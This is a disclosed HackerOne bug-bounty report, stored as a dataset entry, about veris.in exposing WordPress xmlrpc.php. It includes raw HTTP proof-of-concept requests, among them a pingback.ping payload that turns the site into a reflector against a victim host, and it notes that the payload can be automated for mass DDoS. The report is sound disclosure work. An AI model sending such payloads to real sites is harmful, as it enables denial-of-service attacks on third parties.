---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '124097'
original_report_id: '124097'
title: 'Wordpress  Pingback  DDoS Attacks in domain:  veris.in'
weakness: Uncontrolled Resource Consumption
team_handle: veris
created_at: '2016-03-17T20:56:58.447Z'
disclosed_at: '2016-06-12T16:08:41.431Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Wordpress  Pingback  DDoS Attacks in domain:  veris.in

## Metadata

- HackerOne Report ID: 124097
- Weakness: Uncontrolled Resource Consumption
- Program: veris
- Disclosed At: 2016-06-12T16:08:41.431Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi team,

Wordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website veris.in has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.

PoC:
====
In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp proxy, send the request below:
```
POST /xmlrpc.php HTTP/1.1 
Host: veris.in 
Connection: keep-alive 
Content-Length: 175

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>demo.sayHello</methodName> 
<params> 
<param>
<value>admin</value>
</param> 
</params> 
</methodCall>
```

- Notice that a successful response is received showing that the xmlrpc.php file is enabled.

 
- The xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below:

```
POST /xmlrpc.php HTTP/1.1 
Host: veris.in
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://victim.com</string></value>
</param>
<param>
<value><string>https://veris.in/anypost</string></value>
</param>
</params>
</methodCall>
```
- As soon as the above request is sent, the victim host gets an entry in its log file with a request originating from the veris.in domain verifying the pingback.

- This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.

- If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. 

More info: https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html

regards,

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
